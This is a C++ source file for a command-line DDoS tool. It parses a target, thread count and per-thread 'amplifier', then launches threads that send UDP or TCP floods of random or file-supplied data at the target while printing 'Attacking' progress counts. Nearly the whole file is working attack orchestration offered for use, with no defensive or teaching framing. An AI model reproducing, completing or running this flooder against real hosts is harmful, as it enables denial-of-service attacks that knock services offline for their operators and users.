#include "network.hpp"
#include "color.hpp"

#include <getopt.h>
#include <sys/stat.h>
#include <cstring>
#include <csignal>

#define MAX_BUFFER 2048ul

#define HELP COLOR_RESET "Usage: " COLOR_MAGENTA "\"%s\"" COLOR_RESET " -m " COLOR_BLUE "<method>" COLOR_RESET " -t " COLOR_BLUE "<target>" \
             COLOR_RESET " -T " COLOR_BLUE "<threads>" COLOR_RESET " -a " COLOR_BLUE "<amplifier>" COLOR_RESET " " COLOR_CYAN "[OPTIONS]" COLOR_RESET\
             "\n" COLOR_RESET COLOR_YELLOW                                                                                                  \
             "Options:\n"                                                                                                                   \
             " --method|-m    <method>    ddos method\n"                                                                                    \
             " --target|-t    <target>    target address\n"                                                                                 \
             " --threads|-T   <threads>   threads count\n"                                                                                  \
             " --amplifier|-a <amplifier> in-thread requests count\n"                                                                       \
             " --data|-d      <file>      send data from file\n"                                                                            \
             " --debug|-D                 toggle debug printing\n"                                                                          \
             " --proxy|-p     <proxy>     proxy address (not working)" COLOR_RESET "\n"

#define REPORT_FMT COLOR_RESET "Attacking " COLOR_INTENSE COLOR_BLUE "%s" COLOR_WHITE ":" COLOR_YELLOW "%hu" COLOR_RESET " | method " COLOR_MAGENTA \
        "%s" COLOR_RESET " | sent " COLOR_GREEN "%d" COLOR_RESET " | failed " COLOR_RED "%d" COLOR_RESET " | running threads %d\n"


static const char* appname;
static const char* send_data = nullptr;
static int running_threads = 0;
static int sent_requests = 0;
static int failed_requests = 0;
static size_t amplifier = 0;
static std::string method;
static bool debug = false;
static net::inet_address* target_address = nullptr;
static net::inet_address* proxy_address = nullptr;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

static constexpr const char* s_options = "m:t:T:a:d:Dp:";
const option l_options[]{
		{"method",    required_argument, nullptr, 'm'},
		{"target",    required_argument, nullptr, 't'},
		{"threads",   required_argument, nullptr, 'T'},
		{"amplifier", required_argument, nullptr, 'a'},
		{"data",      required_argument, nullptr, 'd'},
		{"debug",     no_argument,       nullptr, 'D'},
		{"proxy",     required_argument, nullptr, 'p'},
		{nullptr}
};


char* rand_bytes(size_t size)
{
	char* data = new char[size];
	--size;
	for (size_t i = 0; i < size; ++i)
		data[i] = ::random() % (INT8_MAX - 1) + 1;
	data[size] = 0;
	return data;
}

void* flood_thread(void*)
{
	::srandom(::time(nullptr));
	for (size_t i = 0; i < amplifier; ++i)
	{
		if (method == "UDP" || method == "udp")
		{
			method = "UDP";
			net::udp_flood flood(*target_address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), proxy_address, debug);
			::pthread_mutex_lock(&mutex);
			if (flood)
				++sent_requests;
			else
				++failed_requests;
			::pthread_mutex_unlock(&mutex);
		}
		else // tcp
		{
			method = "TCP";
			net::tcp_flood flood(*target_address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), proxy_address, debug);
			::pthread_mutex_lock(&mutex);
			if (flood)
				++sent_requests;
			else
				++failed_requests;
			::pthread_mutex_unlock(&mutex);
		}
	}
	::pthread_mutex_lock(&mutex);
	--running_threads;
	::pthread_mutex_unlock(&mutex);
	return nullptr;
}

int main(int argc, char** argv)
{
	appname = argv[0];
	
	int longid;
	int opt;
	size_t threads_count = 0;
	std::string data_file;
	
	while ((opt = ::getopt_long(argc, argv, s_options, l_options, &longid)) >= 0)
	{
		switch (opt)
		{
			case 'm':
			{
				method = std::string(optarg);
				for (char& i: method) i = std::toupper(i);
				break;
			}
			
			case 't':
			{
				auto addr_str = std::string(optarg);
				for (char& i: addr_str) i = std::tolower(i);
				target_address = new net::inet_address(addr_str);
				break;
			}
			
			case 'T':
			{
				threads_count = ::strtoul(optarg, nullptr, 10);
				break;
			}
			
			case 'a':
			{
				amplifier = ::strtoul(optarg, nullptr, 10);
				break;
			}
			
			case 'd':
			{
				data_file = std::string(optarg);
				break;
			}
			
			case 'D':
			{
				debug = true;
				break;
			}
			
			case 'p':
			{
				auto addr_str = std::string(optarg);
				for (char& i: addr_str) i = std::tolower(i);
				proxy_address = new net::inet_address(addr_str);
				break;
			}
			
			default: // '?'
			{
				::printf(HELP, appname);
				::exit(0);
			}
		}
	}
	
	if (debug)
		std::cout << COLOR_YELLOW COLOR_FAINT << "threads_count = " << threads_count << "  amplifier = " << amplifier
				  << "  proxy = " << (proxy_address ? proxy_address->get_ip() : "<NULL>") << ":" << (proxy_address ? proxy_address->get_port() : 0)
				  << COLOR_RESET "\n";
	
	if (!method.empty() && target_address && threads_count && amplifier)
	{
		char* data = nullptr;
		if (!data_file.empty())
		{
			struct stat st{ };
			::stat(data_file.c_str(), &st);
			FILE* file = ::fopen(data_file.c_str(), "rb");
			if (file)
			{
				if (st.st_size < MAX_BUFFER)
				{
					data = new char[st.st_size + 1];
					size_t read = ::fread(data, sizeof(char), st.st_size, file);
					data[read] = 0;
				}
				else
				{
					::fprintf(
							stderr,
							COLOR_RED COLOR_INTENSE "ERROR: " COLOR_RESET COLOR_RED " Couldn't allocate buffer of size = %lu. Maximum size is %lu." COLOR_RESET,
							st.st_size, MAX_BUFFER
					);
					::exit(-1);
				}
			}
			else
			{
				::fprintf(
						stderr,
						COLOR_RED COLOR_INTENSE "ERROR: " COLOR_RESET COLOR_RED " Couldn't open file \"%s\" : %s - %s" COLOR_RESET,
						data_file.c_str(), ::strerrorname_np(errno), ::strerrordesc_np(errno)
				);
				::exit(errno);
			}
		}
		
		send_data = data;
		
		::srandom(::clock());
		
		for (size_t i = 0; i < threads_count; ++i)
		{
			++running_threads;
			pthread_t thread;
			::pthread_create(&thread, nullptr, flood_thread, nullptr);
			::pthread_detach(thread);
		}
		
		while (running_threads > 0)
		{
			::printf(
					REPORT_FMT,
					target_address->get_ip().c_str(), target_address->get_port(), method.c_str(), sent_requests, failed_requests, running_threads
			);
			::sleep(1);
			::srandom(::clock());
		}
		::printf(
				REPORT_FMT,
				target_address->get_ip().c_str(), target_address->get_port(), method.c_str(), sent_requests, failed_requests, running_threads
		);
		::exit(0);
	}
	::printf(HELP, appname);
	::exit(-2);
}
